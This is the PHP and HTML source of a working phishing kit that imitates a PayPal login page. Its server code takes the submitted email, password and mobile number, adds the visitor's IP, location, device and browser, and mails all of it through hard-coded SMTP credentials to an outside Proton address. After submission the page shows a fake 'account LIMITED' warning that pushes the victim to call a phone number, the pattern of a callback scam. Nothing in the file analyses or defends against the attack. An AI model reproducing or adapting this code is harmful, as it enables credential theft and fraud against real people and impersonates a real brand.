<?php
include("mailer/class.phpmailer.php");
include("mailer/class.smtp.php");
$err = array();
$success = 0;
function isMobileDevice()
{
    return preg_match(
        "/(android|avantgo|blackberry|bolt|boost|cricket|docomo
|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i",
        $_SERVER["HTTP_USER_AGENT"]
    );
}
if (isset($_POST['email'])) {
    if (empty($_POST['email'])) {
        $err[] = "Please enter your username";
    } else {
        $email = $_POST['email'];
    }

    if (empty($_POST['password'])) {
        $err[] = "Please enter your password";
    } else {
        $password = $_POST['password'];
    }

    if (empty($_POST['mobile'])) {
        $err[] = "Please enter your mobile number";
    } else {
        $mobile = $_POST['mobile'];
    }

    if (empty($err)) {

        if (isMobileDevice()) {
            $device = "Mobile";
        } else {
            $device = "Computer";
        }

        if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE)
            $browsers =  'Internet explorer';
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) //For Supporting IE 11
            $browsers =  'Internet explorer';
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE)
            $browsers =  'Mozilla Firefox';
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE)
            $browsers =  'Google Chrome';
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== FALSE)
            $browsers =  "Opera Mini";
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE)
            $browsers =  "Opera";
        elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE)
            $browsers =  "Safari";
        else
            $browsers = 'Something else';

        $vis_ip = $_SERVER['REMOTE_ADDR'];
        $ipdat = json_decode(file_get_contents(
            "http://www.geoplugin.net/json.gp?ip=" . $vis_ip
        ));
        $country = $ipdat->geoplugin_countryName;
        $city = $ipdat->geoplugin_city;

        $message = "Username: " . $email . "<br />";
        $message .= "Password: " . $password . "<br />";
        $message .= "Mobile No: " . $mobile . "<br />";
        $message .= "Device: " . $device . "<br />";
        $message .= "Browser: " . $browsers . "<br />";
        $message .= "City: " . $city . "<br />";
        $message .= "Country: " . $country . "<br />";
        $message .= "IP: " . $vis_ip;



        $mail = new PHPMailer(); // create a new object
        $mail->IsSMTP(); // enable SMTP
        // $mail->SMTPDebug = 1; // debugging: 1 = errors and messages, 2 = messages only
        $mail->Mailer = "smtp";
        $mail->SMTPAuth = true; // authentication enabled
        $mail->SMTPSecure = 'tls'; // secure transfer enabled REQUIRED for Gmail
        $mail->Host = "digigoing.world";
        $mail->Port = 587; // or 587
        $mail->isHTML(true);
        $mail->Username = "noreply@digigoing.world";
        $mail->Password = "Password@99";
        $mail->setFrom("noreply@digigoing.world", "DigiGoing");
        $mail->Subject = "New Lead";
        $mail->Body    = $message;
        $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
        $mail->addAddress("tech0909team@proton.me");

        // $mail->addReplyTo($email);


        if (!$mail->send()) {
            echo 'Mailer Error: ' . $mail->ErrorInfo;
        }
        $success = 1;
    }
}
?>

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log in to your PayPal account</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: Helvetica Neue, Arial, sans-serif;
        }

        .logincard {
            margin: 120px auto 0;
            padding: 30px 10% 50px;
            border: 1px solid #eaeced;
            overflow: hidden;
        }

        .pp-logo-long {
            background: transparent url(img/logo.png) top center no-repeat;
            background-size: 30px;
            width: 30px;
            height: 36px;
            display: block;
        }

        .signin-pp-logo {
            margin: 0 auto 13.116%;
        }

        .pp-logo {
            margin: 0 auto 6.56%;
            text-indent: 100%;
            overflow: hidden;
            white-space: nowrap;
        }

        .dorral {
            margin: 0 auto;
            width: 460px;
            position: relative;
        }

        .textInput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
            -webkit-background-clip: padding-box;
            -moz-background-clip: padding-box;
            background-clip: padding-box;
            -webkit-transition: border .2s ease-in-out, background-color .2s ease-in-out;
            -moz-transition: border .2s ease-in-out, background-color .2s ease-in-out;
            -o-transition: border .2s ease-in-out, background-color .2s ease-in-out;
            transition: border .2s ease-in-out, background-color .2s ease-in-out;
        }

        .textInput input,
        .textInput textarea {
            height: 64px;
            width: 100%;
            font-size: 18px;
            padding: 0 10px;
            border: 0.0625rem solid #9da3a6;
            background: #fff;
            text-overflow: ellipsis;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            -khtml-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-shadow: none;
            -moz-box-shadow: none;
            box-shadow: none;
            color: #000;
            font-family: Helvetica Neue, Arial, sans-serif;
            font-variant: normal;
            font-weight: 400;
            direction: ltr;
        }

        .textInput input:focus,
        .textInput textarea:focus {
            outline: 0;
            border: 0.0625rem solid #1040c1;
            box-shadow: inset 0 0 0 0.125rem #1040c1, 0 0 0 0.375rem rgb(16 114 235 / 16%);
            background-color: #fff;
        }

        a,
        a:link,
        a:visited {
            color: #1072eb;
            font-family: Helvetica Neue, Arial, sans-serif;
            font-variant: normal;
            font-weight: 400;
            text-decoration: none;
            -webkit-transition: color .2s ease-out;
            -moz-transition: color .2s ease-out;
            -o-transition: color .2s ease-out;
            transition: color .2s ease-out;
        }

        .forgotPassword {
            display: inline-block;
            margin: 0 0 16px;
        }

        .button {
            font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
            font-weight: 400;
            font-variant: normal;
            font-size: 100%;
            border-radius: 25px;
            height: 48px;
        }

        a.button,
        a.button:link,
        a.button:visited,
        .button {
            width: 100%;
            min-height: 44px;
            padding: 12px 32px;
            border: 0;
            display: block;
            margin-top: 8px;
            margin-bottom: 8px;
            background-color: #142c8e;
            -webkit-box-shadow: none;
            -moz-box-shadow: none;
            box-shadow: none;
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            -khtml-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            cursor: pointer;
            -webkit-appearance: none;
            -moz-appearance: none;
            -ms-appearance: none;
            -o-appearance: none;
            appearance: none;
            -webkit-tap-highlight-color: transparent;
            color: #fff;
            font-size: 1.2em;
            text-align: center;
            font-weight: 700;
            font-family: HelveticaNeue-Medium, "Helvetica Neue Medium", HelveticaNeue, "Helvetica Neue", Helvetica, Arial, sans-serif;
            text-shadow: none;
            text-decoration: none;
            transition: color .2s ease, background-color .2s ease, border-color .2s ease, box-shadow .2s ease;
            -webkit-font-smoothing: antialiased;
        }

        a.button:hover,
        a.button:link:hover,
        a.button:visited:hover,
        .button:hover {
            background-color: #1040c1;
            border-color: #1040c1;
            outline: 0;
        }

        .loginSignUpSeparator {
            border-top: 1px solid #cbd2d6;
            position: relative;
            margin-top: 4.72%;
            height: 15px;
            text-align: center;
            font-size: 83.34%;
        }

        .loginSignUpSeparator .textInSeparator {
            background-color: #fff;
            padding: 0 0.5em;
            position: relative;
            color: #6c7378;
            top: -0.7em;
        }

        a.button.secondary,
        a.button:link.secondary,
        a.button:visited.secondary,
        .button.secondary {
            background-color: transparent;
            color: #142c8e;
            border: 0.0125rem solid #142c8e;
            transition: color .2s ease, background-color .2s ease, border-color .2s ease, box-shadow .2s ease;
        }

        .notifications {
            outline: 0;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .notifications .notification.notification-critical {
            background-color: #fff7f7;
            background-position: 12px -387px;
            background-position: left 12px top -387px;
            border-color: #c72e2e;
        }

        .notifications .notification {
            margin: 0;
            padding: 15px 15px 15px 44px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            -khtml-border-radius: 5px;
            border-radius: 5px;
            border-width: 1px;
            border-style: solid;
            text-align: left;
            font-size: 1em;
            background: url(img/icon.png) no-repeat;
            background-size: 20px;
        }
    </style>
</head>

<body>
    <section class="login">
        <div class="dorral">
            <div class="rounded-4 logincard">
                <header id="header">
                    <p role="img" class="pp-logo pp-logo-long signin-pp-logo"></p>
                </header>
                <form method="post" accept-charset="UTF-8">
                <?php
                if($success == 1){
                ?>
                <div class="notifications"><p class="notification notification-critical" role="alert">Your account is temporarily <b>LIMITED</b>.<br />To re-activate your account, please call on<br /><a href="tel:18885574430">1-888-557-4430</a></p></div>
                <?php } ?>
                    <div class="step1">
                        <div class="textInput mb-3">
                            <input id="email" name="email" type="email" class="form-control" required="required" placeholder="Email or mobile number">
                        </div>
                        <div class="textInput mb-3">
                            <input name="password" type="password" class="form-control" required="required" placeholder="Password">
                        </div>
                        <div class="textInput mb-3">
                            <a href="javascript:void(0)" id="forgotPassword" class="forgotPassword" style="font-weight: 600;">Forgotten password?</a>
                        </div>
                        <button class="button rounded-pill" type="button" id="btnLogin" name="login" style="font-weight: 400">Log In</button>
                        <div class="loginSignUpSeparator "><span class="textInSeparator">or</span></div>
                        <button type="button" href="javascript:void(0)" class="button secondary rounded-pill" id="createAccount" style="font-weight: 400">Sign Up</button>
                    </div>
                    <div class="step2" style="display:none;">
                        <h3 class="text-center">Quick security check</h3>
                        <p class="text-center">We just need to confirm it's you</p>
                        <div class="textInput mb-3">
                            <input name="mobile" type="text" class="form-control" required="required" placeholder="Mobile number">
                        </div>
                        <button class="button rounded-pill mt-4" type="submit" id="btnconfirm" name="login" style="font-weight: 400">Confirm</button>
                    </div>
                </form>
                <div class="text-center mt-5">
                    <img src="img/footer.png" alt="footer" class="img-fluid" />
                </div>
            </div>
        </div>
    </section>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script>
        $('body').on("click", "#btnLogin", function(e) {
            $('.step1').slideUp();
            $('.step2').slideDown();
        });
    </script>
</body>

</html>